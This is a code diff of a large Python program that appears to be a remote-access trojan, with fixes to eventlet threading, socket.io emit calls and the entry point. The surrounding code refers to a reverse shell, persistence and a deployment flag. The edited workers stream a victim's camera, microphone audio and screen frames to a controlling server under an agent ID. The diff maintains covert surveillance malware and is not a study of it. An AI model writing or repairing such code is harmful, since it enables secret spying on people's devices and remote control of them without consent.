@@ -87,7 +87,16 @@ DEPLOYMENT_COMPLETED = False  # Track deployment status to prevent repeated atte
 # Fix eventlet issue by patching BEFORE any other imports
 try:
     import eventlet
-    eventlet.monkey_patch()
+    # More comprehensive monkey patching to fix RLock issues
+    eventlet.monkey_patch(all=True, thread=True, time=True)
+    
+    # Additional fix for RLock greening issues in newer Python versions
+    import threading
+    if hasattr(threading, '_RLock'):
+        threading._RLock = eventlet.green.threading.RLock
+    if hasattr(threading, 'RLock'):
+        threading.RLock = eventlet.green.threading.RLock
+        
 except ImportError:
     pass  # eventlet not available, continue without it
 
@@ -3488,15 +3497,9 @@ def sleep_random_non_blocking():
         sleep_time = random.uniform(0.1, 0.5)  # Much shorter fallback
         time.sleep(sleep_time)
 
-# --- Agent State ---
-STREAMING_ENABLED = False
-STREAM_THREAD = None
-AUDIO_STREAMING_ENABLED = False
-AUDIO_STREAM_THREAD = None
-CAMERA_STREAMING_ENABLED = False
-CAMERA_STREAM_THREADS = []
-camera_capture_queue = None
-camera_encode_queue = None
+# --- Agent State (consolidated with earlier definitions) ---
+# Note: These variables are already defined earlier in the file
+# Removed duplicate definitions to prevent conflicts
 
 # --- Reverse Shell State ---
 REVERSE_SHELL_ENABLED = False
@@ -3685,12 +3688,12 @@ def camera_send_worker(agent_id):
             except queue.Empty:
                 continue
             
-            # Send via socket.io binary
+            # Send via socket.io (binary data is automatically detected)
             try:
                 sio.emit('camera_frame', {
                     'agent_id': agent_id,
                     'frame': encoded_data
-                }, binary=True)
+                })
             except Exception as e:
                 log_message(f"Camera send error: {e}")
                 time.sleep(0.01)
@@ -3730,10 +3733,8 @@ def stream_camera_h264_socketio(agent_id):
 # Legacy HTTP POST audio streaming removed - now using Opus socket.io binary streaming
 
 # Modern Opus audio streaming pipeline variables
-AUDIO_STREAMING_ENABLED = False
-AUDIO_STREAM_THREADS = []
-audio_capture_queue = None
-audio_encode_queue = None
+# Note: AUDIO_STREAMING_ENABLED and related variables are already defined earlier
+# Removed duplicate definitions to prevent conflicts
 
 # Note: TARGET_AUDIO_FPS, AUDIO_CAPTURE_QUEUE_SIZE and AUDIO_ENCODE_QUEUE_SIZE are defined globally
 
@@ -3884,12 +3885,12 @@ def audio_send_worker(agent_id):
             except queue.Empty:
                 continue
             
-            # Send via socket.io binary
+            # Send via socket.io (binary data is automatically detected)
             try:
                 sio.emit('audio_frame', {
                     'agent_id': agent_id,
                     'frame': encoded_data
-                }, binary=True)
+                })
             except Exception as e:
                 log_message(f"Audio send error: {e}")
                 time.sleep(0.01)
@@ -9496,9 +9497,9 @@ if __name__ == "__main__":
         log_message("  ✓ Enhanced performance tuning & monitoring")
         log_message("=" * 60)
     
-    # CRITICAL FIX: Call agent_main() which contains the persistence logic
+    # CRITICAL FIX: Call main_unified() which contains the persistence logic
     try:
-        agent_main()
+        main_unified()
     except KeyboardInterrupt:
         log_message("System shutdown requested.")
     except ImportError as e:
@@ -9605,7 +9606,7 @@ def screen_send_worker(agent_id):
         except queue.Empty:
             continue
         try:
-            sio.emit('screen_frame', {'agent_id': agent_id, 'frame': frame}, binary=True)
+            sio.emit('screen_frame', {'agent_id': agent_id, 'frame': frame})
         except Exception as e:
             log_message(f"SocketIO send error: {e}", "error")
 
